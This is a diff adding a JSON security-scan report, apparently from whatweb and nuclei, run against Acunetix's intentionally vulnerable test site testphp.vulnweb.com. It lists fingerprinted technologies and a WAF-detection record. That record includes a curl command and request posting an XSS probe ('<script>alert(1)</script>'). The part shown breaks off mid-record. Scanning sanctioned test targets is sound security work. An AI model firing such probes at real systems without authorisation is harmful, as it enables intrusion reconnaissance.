@@ -1,0 +1,598 @@
+{
+    "scan_info": {
+        "generated_at": "2026-02-20 01:48:04",
+        "total_findings": 23,
+        "severity_counts": {
+            "CRITICAL": 1,
+            "HIGH": 2,
+            "MEDIUM": 0,
+            "LOW": 0,
+            "INFO": 20
+        }
+    },
+    "findings": [
+        {
+            "tool": "whatweb",
+            "url": "http://testphp.vulnweb.com/",
+            "finding_name": "Technology Detected: ActiveX[D27CDB6E-AE6D-11cf-96B8-444553540000]",
+            "severity": "INFO",
+            "risk_score": 1,
+            "category": "reconnaissance",
+            "description": "Detected technology: ActiveX[D27CDB6E-AE6D-11cf-96B8-444553540000]",
+            "timestamp": "2026-02-20 01:38:17",
+            "raw_output": "http://testphp.vulnweb.com/ [200 OK] ActiveX[D27CDB6E-AE6D-11cf-96B8-444553540000], Adobe-Flash, Country[UNITED STATES][US], Email[wvs@acunetix.com], HTTPServer[nginx/1.19.0], IP[44.228.249.3], Object[http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0][clsid:D27CDB6E-AE6D-11cf-96B8-444553540000], PHP[5.6.40-38+ubuntu20.04.1+deb.sury.org+1], Script[text/JavaScript], Title[Home of Acunetix Art], X-Powered-By[PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1], nginx[1.19.0]"
+        },
+        {
+            "tool": "whatweb",
+            "url": "http://testphp.vulnweb.com/",
+            "finding_name": "Technology Detected: Adobe-Flash",
+            "severity": "INFO",
+            "risk_score": 1,
+            "category": "reconnaissance",
+            "description": "Detected technology: Adobe-Flash",
+            "timestamp": "2026-02-20 01:38:17",
+            "raw_output": "http://testphp.vulnweb.com/ [200 OK] ActiveX[D27CDB6E-AE6D-11cf-96B8-444553540000], Adobe-Flash, Country[UNITED STATES][US], Email[wvs@acunetix.com], HTTPServer[nginx/1.19.0], IP[44.228.249.3], Object[http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0][clsid:D27CDB6E-AE6D-11cf-96B8-444553540000], PHP[5.6.40-38+ubuntu20.04.1+deb.sury.org+1], Script[text/JavaScript], Title[Home of Acunetix Art], X-Powered-By[PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1], nginx[1.19.0]"
+        },
+        {
+            "tool": "whatweb",
+            "url": "http://testphp.vulnweb.com/",
+            "finding_name": "Technology Detected: Country[UNITED STATES][US]",
+            "severity": "INFO",
+            "risk_score": 1,
+            "category": "reconnaissance",
+            "description": "Detected technology: Country[UNITED STATES][US]",
+            "timestamp": "2026-02-20 01:38:17",
+            "raw_output": "http://testphp.vulnweb.com/ [200 OK] ActiveX[D27CDB6E-AE6D-11cf-96B8-444553540000], Adobe-Flash, Country[UNITED STATES][US], Email[wvs@acunetix.com], HTTPServer[nginx/1.19.0], IP[44.228.249.3], Object[http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0][clsid:D27CDB6E-AE6D-11cf-96B8-444553540000], PHP[5.6.40-38+ubuntu20.04.1+deb.sury.org+1], Script[text/JavaScript], Title[Home of Acunetix Art], X-Powered-By[PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1], nginx[1.19.0]"
+        },
+        {
+            "tool": "whatweb",
+            "url": "http://testphp.vulnweb.com/",
+            "finding_name": "Technology Detected: Email[wvs@acunetix.com]",
+            "severity": "INFO",
+            "risk_score": 1,
+            "category": "reconnaissance",
+            "description": "Detected technology: Email[wvs@acunetix.com]",
+            "timestamp": "2026-02-20 01:38:17",
+            "raw_output": "http://testphp.vulnweb.com/ [200 OK] ActiveX[D27CDB6E-AE6D-11cf-96B8-444553540000], Adobe-Flash, Country[UNITED STATES][US], Email[wvs@acunetix.com], HTTPServer[nginx/1.19.0], IP[44.228.249.3], Object[http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0][clsid:D27CDB6E-AE6D-11cf-96B8-444553540000], PHP[5.6.40-38+ubuntu20.04.1+deb.sury.org+1], Script[text/JavaScript], Title[Home of Acunetix Art], X-Powered-By[PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1], nginx[1.19.0]"
+        },
+        {
+            "tool": "whatweb",
+            "url": "http://testphp.vulnweb.com/",
+            "finding_name": "Technology Detected: HTTPServer[nginx/1.19.0]",
+            "severity": "INFO",
+            "risk_score": 1,
+            "category": "reconnaissance",
+            "description": "Detected technology: HTTPServer[nginx/1.19.0]",
+            "timestamp": "2026-02-20 01:38:17",
+            "raw_output": "http://testphp.vulnweb.com/ [200 OK] ActiveX[D27CDB6E-AE6D-11cf-96B8-444553540000], Adobe-Flash, Country[UNITED STATES][US], Email[wvs@acunetix.com], HTTPServer[nginx/1.19.0], IP[44.228.249.3], Object[http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0][clsid:D27CDB6E-AE6D-11cf-96B8-444553540000], PHP[5.6.40-38+ubuntu20.04.1+deb.sury.org+1], Script[text/JavaScript], Title[Home of Acunetix Art], X-Powered-By[PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1], nginx[1.19.0]"
+        },
+        {
+            "tool": "whatweb",
+            "url": "http://testphp.vulnweb.com/",
+            "finding_name": "Technology Detected: IP[44.228.249.3]",
+            "severity": "INFO",
+            "risk_score": 1,
+            "category": "reconnaissance",
+            "description": "Detected technology: IP[44.228.249.3]",
+            "timestamp": "2026-02-20 01:38:17",
+            "raw_output": "http://testphp.vulnweb.com/ [200 OK] ActiveX[D27CDB6E-AE6D-11cf-96B8-444553540000], Adobe-Flash, Country[UNITED STATES][US], Email[wvs@acunetix.com], HTTPServer[nginx/1.19.0], IP[44.228.249.3], Object[http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0][clsid:D27CDB6E-AE6D-11cf-96B8-444553540000], PHP[5.6.40-38+ubuntu20.04.1+deb.sury.org+1], Script[text/JavaScript], Title[Home of Acunetix Art], X-Powered-By[PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1], nginx[1.19.0]"
+        },
+        {
+            "tool": "whatweb",
+            "url": "http://testphp.vulnweb.com/",
+            "finding_name": "Technology Detected: Object[http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0][clsid:D27CDB6E-AE6D-11cf-96B8-444553540000]",
+            "severity": "INFO",
+            "risk_score": 1,
+            "category": "reconnaissance",
+            "description": "Detected technology: Object[http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0][clsid:D27CDB6E-AE6D-11cf-96B8-444553540000]",
+            "timestamp": "2026-02-20 01:38:17",
+            "raw_output": "http://testphp.vulnweb.com/ [200 OK] ActiveX[D27CDB6E-AE6D-11cf-96B8-444553540000], Adobe-Flash, Country[UNITED STATES][US], Email[wvs@acunetix.com], HTTPServer[nginx/1.19.0], IP[44.228.249.3], Object[http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0][clsid:D27CDB6E-AE6D-11cf-96B8-444553540000], PHP[5.6.40-38+ubuntu20.04.1+deb.sury.org+1], Script[text/JavaScript], Title[Home of Acunetix Art], X-Powered-By[PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1], nginx[1.19.0]"
+        },
+        {
+            "tool": "whatweb",
+            "url": "http://testphp.vulnweb.com/",
+            "finding_name": "Technology Detected: PHP[5.6.40-38+ubuntu20.04.1+deb.sury.org+1]",
+            "severity": "INFO",
+            "risk_score": 1,
+            "category": "reconnaissance",
+            "description": "Detected technology: PHP[5.6.40-38+ubuntu20.04.1+deb.sury.org+1]",
+            "timestamp": "2026-02-20 01:38:17",
+            "raw_output": "http://testphp.vulnweb.com/ [200 OK] ActiveX[D27CDB6E-AE6D-11cf-96B8-444553540000], Adobe-Flash, Country[UNITED STATES][US], Email[wvs@acunetix.com], HTTPServer[nginx/1.19.0], IP[44.228.249.3], Object[http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0][clsid:D27CDB6E-AE6D-11cf-96B8-444553540000], PHP[5.6.40-38+ubuntu20.04.1+deb.sury.org+1], Script[text/JavaScript], Title[Home of Acunetix Art], X-Powered-By[PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1], nginx[1.19.0]"
+        },
+        {
+            "tool": "whatweb",
+            "url": "http://testphp.vulnweb.com/",
+            "finding_name": "Technology Detected: Script[text/JavaScript]",
+            "severity": "INFO",
+            "risk_score": 1,
+            "category": "reconnaissance",
+            "description": "Detected technology: Script[text/JavaScript]",
+            "timestamp": "2026-02-20 01:38:17",
+            "raw_output": "http://testphp.vulnweb.com/ [200 OK] ActiveX[D27CDB6E-AE6D-11cf-96B8-444553540000], Adobe-Flash, Country[UNITED STATES][US], Email[wvs@acunetix.com], HTTPServer[nginx/1.19.0], IP[44.228.249.3], Object[http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0][clsid:D27CDB6E-AE6D-11cf-96B8-444553540000], PHP[5.6.40-38+ubuntu20.04.1+deb.sury.org+1], Script[text/JavaScript], Title[Home of Acunetix Art], X-Powered-By[PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1], nginx[1.19.0]"
+        },
+        {
+            "tool": "whatweb",
+            "url": "http://testphp.vulnweb.com/",
+            "finding_name": "Technology Detected: Title[Home of Acunetix Art]",
+            "severity": "INFO",
+            "risk_score": 1,
+            "category": "reconnaissance",
+            "description": "Detected technology: Title[Home of Acunetix Art]",
+            "timestamp": "2026-02-20 01:38:17",
+            "raw_output": "http://testphp.vulnweb.com/ [200 OK] ActiveX[D27CDB6E-AE6D-11cf-96B8-444553540000], Adobe-Flash, Country[UNITED STATES][US], Email[wvs@acunetix.com], HTTPServer[nginx/1.19.0], IP[44.228.249.3], Object[http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0][clsid:D27CDB6E-AE6D-11cf-96B8-444553540000], PHP[5.6.40-38+ubuntu20.04.1+deb.sury.org+1], Script[text/JavaScript], Title[Home of Acunetix Art], X-Powered-By[PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1], nginx[1.19.0]"
+        },
+        {
+            "tool": "whatweb",
+            "url": "http://testphp.vulnweb.com/",
+            "finding_name": "Technology Detected: X-Powered-By[PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1]",
+            "severity": "INFO",
+            "risk_score": 1,
+            "category": "reconnaissance",
+            "description": "Detected technology: X-Powered-By[PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1]",
+            "timestamp": "2026-02-20 01:38:17",
+            "raw_output": "http://testphp.vulnweb.com/ [200 OK] ActiveX[D27CDB6E-AE6D-11cf-96B8-444553540000], Adobe-Flash, Country[UNITED STATES][US], Email[wvs@acunetix.com], HTTPServer[nginx/1.19.0], IP[44.228.249.3], Object[http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0][clsid:D27CDB6E-AE6D-11cf-96B8-444553540000], PHP[5.6.40-38+ubuntu20.04.1+deb.sury.org+1], Script[text/JavaScript], Title[Home of Acunetix Art], X-Powered-By[PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1], nginx[1.19.0]"
+        },
+        {
+            "tool": "whatweb",
+            "url": "http://testphp.vulnweb.com/",
+            "finding_name": "Technology Detected: nginx[1.19.0]",
+            "severity": "INFO",
+            "risk_score": 1,
+            "category": "reconnaissance",
+            "description": "Detected technology: nginx[1.19.0]",
+            "timestamp": "2026-02-20 01:38:17",
+            "raw_output": "http://testphp.vulnweb.com/ [200 OK] ActiveX[D27CDB6E-AE6D-11cf-96B8-444553540000], Adobe-Flash, Country[UNITED STATES][US], Email[wvs@acunetix.com], HTTPServer[nginx/1.19.0], IP[44.228.249.3], Object[http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0][clsid:D27CDB6E-AE6D-11cf-96B8-444553540000], PHP[5.6.40-38+ubuntu20.04.1+deb.sury.org+1], Script[text/JavaScript], Title[Home of Acunetix Art], X-Powered-By[PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1], nginx[1.19.0]"
+        },
+        {
+            "tool": "nuclei",
+            "url": "http://testphp.vulnweb.com/",
+            "finding_name": "Extract URLs from HTML attributes",
+            "severity": "INFO",
+            "risk_score": 1,
+            "category": "vulnerability",
+            "description": "",
+            "timestamp": "2026-02-20 01:43:11",
+            "raw_output": {
+                "template": "headless/extract-urls.yaml",
+                "template-url": "https://cloud.projectdiscovery.io/public/extract-urls",
+                "template-id": "extract-urls",
+                "template-path": "/home/kali/.local/nuclei-templates/headless/extract-urls.yaml",
+                "info": {
+                    "name": "Extract URLs from HTML attributes",
+                    "author": [
+                        "dwisiswant0"
+                    ],
+                    "tags": [
+                        "headless",
+                        "extractor",
+                        "discovery"
+                    ],
+                    "severity": "info"
+                },
+                "type": "headless",
+                "host": "testphp.vulnweb.com",
+                "port": "80",
+                "scheme": "http",
+                "url": "http://testphp.vulnweb.com/",
+                "path": "/",
+                "matched-at": "http://testphp.vulnweb.com/",
+                "extracted-results": [
+                    "\nhttp://testphp.vulnweb.com/style.css\r\nhttps://www.acunetix.com/\r\nhttp://testphp.vulnweb.com/images/logo.gif\r\nhttps://www.acunetix.com/vulnerability-scanner/\r\nhttp://testphp.vulnweb.com/index.php\r\nhttp://testphp.vulnweb.com/categories.php\r\nhttp://testphp.vulnweb.com/artists.php\r\nhttp://testphp.vulnweb.com/disclaimer.php\r\nhttp://testphp.vulnweb.com/cart.php\r\nhttp://testphp.vulnweb.com/guestbook.php\r\nhttp://testphp.vulnweb.com/AJAX/index.php\r\nhttp://testphp.vulnweb.com/search.php?test=query\r\nhttp://testphp.vulnweb.com/login.php\r\nhttp://testphp.vulnweb.com/userinfo.php\r\nhttp://www.acunetix.com/\r\nhttps://www.acunetix.com/vulnerability-scanner/php-security-scanner/\r\nhttps://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/\r\nhttp://www.eclectasy.com/Fractal-Explorer/index.html\r\nhttp://testphp.vulnweb.com/Flash/add.swf\r\nhttp://testphp.vulnweb.com/privacy.php\r\nmailto:wvs@acunetix.com\r\nhttp://testphp.vulnweb.com/Mod_Rewrite_Shop/\r\nhttp://testphp.vulnweb.com/hpp/\n"
+                ],
+                "response": "<html><!-- InstanceBegin template=\"/Templates/main_dynamic_template.dwt.php\" codeOutsideHTMLIsLocked=\"false\" --><head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-2\">\n\n<!-- InstanceBeginEditable name=\"document_title_rgn\" -->\n<title>Home of Acunetix Art</title>\n<!-- InstanceEndEditable -->\n<link rel=\"stylesheet\" href=\"style.css\" type=\"text/css\">\n<!-- InstanceBeginEditable name=\"headers_rgn\" -->\n<!-- here goes headers headers -->\n<!-- InstanceEndEditable -->\n<script language=\"JavaScript\" type=\"text/JavaScript\">\n<!--\nfunction MM_reloadPage(init) {  //reloads the window if Nav4 resized\n  if (init==true) with (navigator) {if ((appName==\"Netscape\")&&(parseInt(appVersion)==4)) {\n    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}\n  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();\n}\nMM_reloadPage(true);\n//-->\n</script>\n\n</head>\n<body> \n<div id=\"mainLayer\" style=\"position:absolute; width:700px; z-index:1\">\n<div id=\"masthead\"> \n  <h1 id=\"siteName\"><a href=\"https://www.acunetix.com/\"><img src=\"images/logo.gif\" width=\"306\" height=\"38\" border=\"0\" alt=\"Acunetix website security\"></a></h1>   \n  <h6 id=\"siteInfo\">TEST and Demonstration site for <a href=\"https://www.acunetix.com/vulnerability-scanner/\">Acunetix Web Vulnerability Scanner</a></h6>\n  <div id=\"globalNav\"> \n      \t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\"><tbody><tr>\n\t<td align=\"left\">\n\t\t<a href=\"index.php\">home</a> | <a href=\"categories.php\">categories</a> | <a href=\"artists.php\">artists\n\t\t</a> | <a href=\"disclaimer.php\">disclaimer</a> | <a href=\"cart.php\">your cart</a> | \n\t\t<a href=\"guestbook.php\">guestbook</a> | \n\t\t<a href=\"AJAX/index.php\">AJAX Demo</a>\n\t</td>\n\t<td align=\"right\">\n\t\t</td>\n\t</tr></tbody></table>\n  </div> \n</div> \n<!-- end masthead --> \n\n<!-- begin content -->\n<!-- InstanceBeginEditable name=\"content_rgn\" -->\n<div id=\"content\">\n\t<h2 id=\"pageName\">welcome to our page</h2>\n\t  <div class=\"story\">\n\t\t<h3>Test site for Acunetix WVS.</h3>\n\t  </div>\n</div>\n<!-- InstanceEndEditable -->\n<!--end content -->\n\n<div id=\"navBar\"> \n  <div id=\"search\"> \n    <form action=\"search.php?test=query\" method=\"post\"> \n      <label>search art</label> \n      <input name=\"searchFor\" type=\"text\" size=\"10\"> \n      <input name=\"goButton\" type=\"submit\" value=\"go\"> \n    </form> \n  </div> \n  <div id=\"sectionLinks\"> \n    <ul> \n      <li><a href=\"categories.php\">Browse categories</a></li> \n      <li><a href=\"artists.php\">Browse artists</a></li> \n      <li><a href=\"cart.php\">Your cart</a></li> \n      <li><a href=\"login.php\">Signup</a></li>\n\t  <li><a href=\"userinfo.php\">Your profile</a></li>\n\t  <li><a href=\"guestbook.php\">Our guestbook</a></li>\n\t\t<li><a href=\"AJAX/index.php\">AJAX Demo</a></li>\n\t   \n    </ul> \n  </div> \n  <div class=\"relatedLinks\"> \n    <h3>Links</h3> \n    <ul> \n      <li><a href=\"http://www.acunetix.com\">Security art</a></li> \n\t  <li><a href=\"https://www.acunetix.com/vulnerability-scanner/php-security-scanner/\">PHP scanner</a></li>\n\t  <li><a href=\"https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/\">PHP vuln help</a></li>\n\t  <li><a href=\"http://www.eclectasy.com/Fractal-Explorer/index.html\">Fractal Explorer</a></li> \n    </ul> \n  </div> \n  <div id=\"advert\"> \n    <p>\n      <object classid=\"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\" codebase=\"http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0\" width=\"107\" height=\"66\">\n        <param name=\"movie\" value=\"Flash/add.swf\">\n        <param name=\"quality\" value=\"high\">\n        <embed src=\"Flash/add.swf\" quality=\"high\" pluginspage=\"http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash\" type=\"application/x-shockwave-flash\" width=\"107\" height=\"66\">\n      </object>\n    </p>\n  </div> \n</div> \n\n<!--end navbar --> \n<div id=\"siteInfo\">  <a href=\"http://www.acunetix.com\">About Us</a> | <a href=\"privacy.php\">Privacy Policy</a> | <a href=\"mailto:wvs@acunetix.com\">Contact Us</a> | <a href=\"/Mod_Rewrite_Shop/\">Shop</a> | <a href=\"/hpp/\">HTTP Parameter Pollution</a> | \u00a92019\n  Acunetix Ltd \n</div> \n    \n    \n<br> \n<div style=\"background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px\">\n<p style=\"padding-left:5%;padding-right:5%\"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>\n</div>\n</div>\n\n\n</body><!-- InstanceEnd --></html>",
+                "timestamp": "2026-02-20T01:38:34.691831875-05:00",
+                "matcher-status": true
+            }
+        },
+        {
+            "tool": "nuclei",
+            "url": "http://testphp.vulnweb.com/",
+            "finding_name": "WAF Detection",
+            "severity": "INFO",
+            "risk_score": 1,
+            "category": "vulnerability",
+            "description": "A web application firewall was detected.",
+            "timestamp": "2026-02-20 01:43:11",
+            "raw_output": {
+                "template": "http/technologies/waf-detect.yaml",
+                "template-url": "https://cloud.projectdiscovery.io/public/waf-detect",
+                "template-id": "waf-detect",
+                "template-path": "/home/kali/.local/nuclei-templates/http/technologies/waf-detect.yaml",
+                "info": {
+                    "name": "WAF Detection",
+                    "author": [
+                        "dwisiswant0",
+                        "lu4nx"
+                    ],
+                    "tags": [
+                        "waf",
+                        "tech",
+                        "misc",
+                        "discovery"
+                    ],
+                    "description": "A web application firewall was detected.",
+                    "reference": [
+                        "https://github.com/Ekultek/WhatWaf"
+                    ],
+                    "severity": "info",
+                    "metadata": {
+                        "max-request": 1
+                    },
+                    "classification": {
+                        "cve-id": null,
+                        "cwe-id": [
+                            "cwe-200"
+                        ]
+                    }
+                },
+                "matcher-name": "nginxgeneric",
+                "type": "http",
+                "host": "testphp.vulnweb.com",
+                "port": "80",
+                "scheme": "http",
+                "url": "http://testphp.vulnweb.com/",
+                "path": "/",
+                "matched-at": "http://testphp.vulnweb.com/",
+                "request": "POST / HTTP/1.1\r\nHost: testphp.vulnweb.com\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36\r\nConnection: close\r\nContent-Length: 27\r\nContent-Type: application/x-www-form-urlencoded\r\nAccept-Encoding: gzip\r\n\r\n_=<script>alert(1)</script>",
+                "response": "HTTP/1.1 200 OK\r\nConnection: close\r\nTransfer-Encoding: chunked\r\nContent-Type: text/html; charset=UTF-8\r\nDate: Fri, 20 Feb 2026 06:40:27 GMT\r\nServer: nginx/1.19.0\r\nX-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1\r\n\r\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd\">\n<html><!-- InstanceBegin template=\"/Templates/main_dynamic_template.dwt.php\" codeOutsideHTMLIsLocked=\"false\" -->\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-2\">\n\n<!-- InstanceBeginEditable name=\"document_title_rgn\" -->\n<title>Home of Acunetix Art</title>\n<!-- InstanceEndEditable -->\n<link rel=\"stylesheet\" href=\"style.css\" type=\"text/css\">\n<!-- InstanceBeginEditable name=\"headers_rgn\" -->\n<!-- here goes headers headers -->\n<!-- InstanceEndEditable -->\n<script language=\"JavaScript\" type=\"text/JavaScript\">\n<!--\nfunction MM_reloadPage(init) {  //reloads the window if Nav4 resized\n  if (init==true) with (navigator) {if ((appName==\"Netscape\")&&(parseInt(appVersion)==4)) {\n    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}\n  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();\n}\nMM_reloadPage(true);\n//-->\n</script>\n\n</head>\n<body> \n<div id=\"mainLayer\" style=\"position:absolute; width:700px; z-index:1\">\n<div id=\"masthead\"> \n  <h1 id=\"siteName\"><a href=\"https://www.acunetix.com/\"><img src=\"images/logo.gif\" width=\"306\" height=\"38\" border=\"0\" alt=\"Acunetix website security\"></a></h1>   \n  <h6 id=\"siteInfo\">TEST and Demonstration site for <a href=\"https://www.acunetix.com/vulnerability-scanner/\">Acunetix Web Vulnerability Scanner</a></h6>\n  <div id=\"globalNav\"> \n      \t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\"><tr>\n\t<td align=\"left\">\n\t\t<a href=\"index.php\">home</a> | <a href=\"categories.php\">categories</a> | <a href=\"artists.php\">artists\n\t\t</a> | <a href=\"disclaimer.php\">disclaimer</a> | <a href=\"cart.php\">your cart</a> | \n\t\t<a href=\"guestbook.php\">guestbook</a> | \n\t\t<a href=\"AJAX/index.php\">AJAX Demo</a>\n\t</td>\n\t<td align=\"right\">\n\t\t</td>\n\t</tr></table>\n  </div> \n</div> \n<!-- end masthead --> \n\n<!-- begin content -->\n<!-- InstanceBeginEditable name=\"content_rgn\" -->\n<div id=\"content\">\n\t<h2 id=\"pageName\">welcome to our page</h2>\n\t  <div class=\"story\">\n\t\t<h3>Test site for Acunetix WVS.</h3>\n\t  </div>\n</div>\n<!-- InstanceEndEditable -->\n<!--end content -->\n\n<div id=\"navBar\"> \n  <div id=\"search\"> \n    <form action=\"search.php?test=query\" method=\"post\"> \n      <label>search art</label> \n      <input name=\"searchFor\" type=\"text\" size=\"10\"> \n      <input name=\"goButton\" type=\"submit\" value=\"go\"> \n    </form> \n  </div> \n  <div id=\"sectionLinks\"> \n    <ul> \n      <li><a href=\"categories.php\">Browse categories</a></li> \n      <li><a href=\"artists.php\">Browse artists</a></li> \n      <li><a href=\"cart.php\">Your cart</a></li> \n      <li><a href=\"login.php\">Signup</a></li>\n\t  <li><a href=\"userinfo.php\">Your profile</a></li>\n\t  <li><a href=\"guestbook.php\">Our guestbook</a></li>\n\t\t<li><a href=\"AJAX/index.php\">AJAX Demo</a></li>\n\t  </li> \n    </ul> \n  </div> \n  <div class=\"relatedLinks\"> \n    <h3>Links</h3> \n    <ul> \n      <li><a href=\"http://www.acunetix.com\">Security art</a></li> \n\t  <li><a href=\"https://www.acunetix.com/vulnerability-scanner/php-security-scanner/\">PHP scanner</a></li>\n\t  <li><a href=\"https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/\">PHP vuln help</a></li>\n\t  <li><a href=\"http://www.eclectasy.com/Fractal-Explorer/index.html\">Fractal Explorer</a></li> \n    </ul> \n  </div> \n  <div id=\"advert\"> \n    <p>\n      <object classid=\"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\" codebase=\"http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0\" width=\"107\" height=\"66\">\n        <param name=\"movie\" value=\"Flash/add.swf\">\n        <param name=quality value=high>\n        <embed src=\"Flash/add.swf\" quality=high pluginspage=\"http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash\" type=\"application/x-shockwave-flash\" width=\"107\" height=\"66\"></embed>\n      </object>\n    </p>\n  </div> \n</div> \n\n<!--end navbar --> \n<div id=\"siteInfo\">  <a href=\"http://www.acunetix.com\">About Us</a> | <a href=\"privacy.php\">Privacy Policy</a> | <a href=\"mailto:wvs@acunetix.com\">Contact Us</a> | <a href=\"/Mod_Rewrite_Shop/\">Shop</a> | <a href=\"/hpp/\">HTTP Parameter Pollution</a> | &copy;2019\n  Acunetix Ltd \n</div> \n    \n    \n<br> \n<div style=\"background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px\">\n<p style=\"padding-left:5%;padding-right:5%\"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>\n</div>\n</div>\n</body>\n<!-- InstanceEnd --></html>\n",
+                "ip": "44.228.249.3",
+                "timestamp": "2026-02-20T01:40:26.538950769-05:00",
+                "curl-command": "curl -X 'POST' -d '_=<script>alert(1)</script>' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Host: testphp.vulnweb.com' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36' 'http://testphp.vulnweb.com/'",
+                "matcher-status": true
+            }
+        },
+        {
+            "tool": "nuclei",
+            "url": "http://testphp.vulnweb.com/",
+            "finding_name": "Nginx End-of-Life - Detect",
+            "severity": "INFO",
+            "risk_score": 1,
+            "category": "vulnerability",
+            "description": "Detected Nginx versions that have reached End-of-Life (EOL) and no longer receive security updates.\n",
+            "timestamp": "2026-02-20 01:43:11",
+            "raw_output": {
+                "template": "http/technologies/eol/nginx-eol.yaml",
+                "template-url": "https://cloud.projectdiscovery.io/public/nginx-eol",
+                "template-id": "nginx-eol",
+                "template-path": "/home/kali/.local/nuclei-templates/http/technologies/eol/nginx-eol.yaml",
+                "info": {
+                    "name": "Nginx End-of-Life - Detect",
+                    "author": [
+                        "shivam kamboj"
+                    ],
+                    "tags": [
+                        "tech",
+                        "nginx",
+                        "eol"
+                    ],
+                    "description": "Detected Nginx versions that have reached End-of-Life (EOL) and no longer receive security updates.\n",
+                    "reference": [
+                        "https://endoflife.date/nginx",
+                        "https://nginx.org/en/download.html"
+                    ],
+                    "severity": "info",
+                    "metadata": {
+                        "verified": true,
+                        "max-request": 1,
+                        "shodan-query": "Server: nginx/",
+                        "product": "nginx",
+                        "vendor": "nginx"
+                    }
+                },
+                "extractor-name": "version",
+                "type": "http",
+                "host": "testphp.vulnweb.com",
+                "port": "80",
+                "scheme": "http",
+                "url": "http://testphp.vulnweb.com/",
+                "path": "/",
+                "matched-at": "http://testphp.vulnweb.com/",
+                "extracted-results": [
+                    "1.19.0"
+                ],
+                "request": "GET / HTTP/1.1\r\nHost: testphp.vulnweb.com\r\nUser-Agent: Mozilla/5.0 (ZZ; Linux i686; rv:130.0) Gecko/20100101 Firefox/130.0\r\nConnection: close\r\nAccept: */*\r\nAccept-Language: en\r\nAccept-Encoding: gzip\r\n\r\n",
